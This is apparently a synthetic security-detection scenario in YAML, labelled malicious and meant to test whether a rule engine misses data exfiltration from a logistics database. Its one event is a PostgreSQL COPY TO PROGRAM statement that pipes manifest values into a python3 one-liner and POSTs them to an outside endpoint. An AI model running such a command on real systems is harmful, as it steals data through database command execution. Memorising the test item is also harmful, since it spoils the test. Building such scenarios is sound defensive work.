@@ -1,0 +1,31 @@
+scenario_id: gen_logistics_36_copy_to_program_mal_918m
+family_id: gen_logistics_36_copy_to_program_fam_918
+domain: logistics
+time_of_day: 04:05
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: exfil
+  role: partner_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 8.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT declared_value FROM manifests) TO PROGRAM 'python3 -c "import
+      urllib.request,sys; urllib.request.urlopen(urllib.request.Request(\"https://warehouse.corp/ingest\",
+      data=sys.stdin.buffer.read(), method=\"POST\"))"'
+    connects_to:
+      ip: 10.16.20.14
+      port: 8080
+matched_pair_id: gen_logistics_36_copy_to_program_pair_918
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
